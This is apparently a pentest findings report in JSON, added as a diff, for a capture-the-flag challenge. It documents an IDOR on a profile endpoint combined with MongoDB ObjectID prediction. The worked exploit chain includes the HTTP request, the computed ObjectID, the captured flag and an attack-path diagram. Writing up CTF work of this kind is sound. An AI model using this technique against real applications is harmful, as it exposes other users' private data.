@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:50:35.924539+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "7dc68065-711a-4c62-8cc8-c98bcb16027e",
+      "timestamp": "2026-04-13T11:50:35.924433+00:00",
+      "title": "IDOR via MongoDB ObjectID Prediction - First User Profile Exposed (CTF Flag)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40155/profile/69dcd7a94ab3b44497fd611a",
+      "description": "The /profile/:userId endpoint is vulnerable to Insecure Direct Object Reference (IDOR). No authentication or authorization check is performed - any MongoDB ObjectID can be accessed directly. Additionally, the application leaks the app start timestamp on the homepage and registration page (1776080809), which is precisely the creation time of the first user. The registration endpoint returns the caller's MongoDB ObjectID and a 'distance' hint (distance=4) revealing how many counter increments separate the new user from the first user. Using these clues, an attacker can reconstruct the first user's ObjectID: [app_start_timestamp_hex][same_random_bytes][newuser_counter - distance] = 69dcd7a9 + 4ab3b44497 + (fd611e - 4) = 69dcd7a94ab3b44497fd611a. Accessing /profile/69dcd7a94ab3b44497fd611a reveals user0's private profile including the CTF flag.",
+      "evidence": "GET /profile/69dcd7a94ab3b44497fd611a HTTP/1.1\nHost: 172.17.0.1:40155\n\nResponse: 200 OK\n<h1>Welcome, user0</h1>\n<p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>\n\nExploit chain:\n1. Homepage leaks first-user creation timestamp: 1776080809 (0x69DCD7A9)\n2. POST /register returns attacker's ObjectID (69dcd8054ab3b44497fd611e) + distance=4\n3. Predicted first user ObjectID: timestamp(0x69DCD7A9) + random(4ab3b44497) + counter(fd611e-4=fd611a) = 69dcd7a94ab3b44497fd611a\n4. GET /profile/69dcd7a94ab3b44497fd611a => FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}",
+      "tool_used": "manual HTTP request + MongoDB ObjectID analysis",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "6cd07d7f-39a9-4819-8cf0-c37522808242",
+      "timestamp": "2026-04-13T11:50:45.436717+00:00",
+      "title": "GetTheFirst - Attack Path",
+      "mermaid": "flowchart TD\n  A[\"Attacker\"] --> B[\"GET / - Homepage\"]\n  B --> C[\"Leaks first-user timestamp: 1776080809\"]\n  A --> D[\"POST /register - Create account\"]\n  D --> E[\"Response: own ObjectID + distance=4 hint\"]\n  C --> F[\"Compute first user ObjectID\"]\n  E --> F\n  F --> G[\"GET /profile/69dcd7a94ab3b44497fd611a\"]\n  G --> H[\"IDOR - No auth check\"]\n  H --> I[\"user0 profile - FLAG extracted\"]\n  \n  subgraph ObjectID[\"MongoDB ObjectID Construction\"]\n    J[\"Timestamp bytes: 0x69DCD7A9\"]\n    K[\"Random bytes: 4ab3b44497 same process\"]\n    L[\"Counter: 0xFD611E - 4 = 0xFD611A\"]\n    J --> M[\"69dcd7a94ab3b44497fd611a\"]\n    K --> M\n    L --> M\n  end"
+    }
+  ]
+}
